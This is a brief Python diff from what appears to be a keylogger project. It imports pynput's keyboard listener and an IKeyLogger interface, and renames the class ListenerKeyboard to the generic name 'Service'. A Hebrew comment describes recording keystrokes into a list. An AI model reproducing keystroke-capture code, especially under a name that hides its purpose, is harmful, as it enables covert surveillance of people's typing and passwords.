@@ -1,9 +1,8 @@
 import time
-
 from pynput.keyboard import Listener
 from interface_agent import IKeyLogger
 
-class ListenerKeyboard(IKeyLogger):
+class Service(IKeyLogger):
     # בעת יצירת מופע יוצר אוטומטית מערך ריק, מאזין למקלדת, ובודק לפעולות בפונקציה get_logged_keys()
     def __init__(self):
         self.list = []
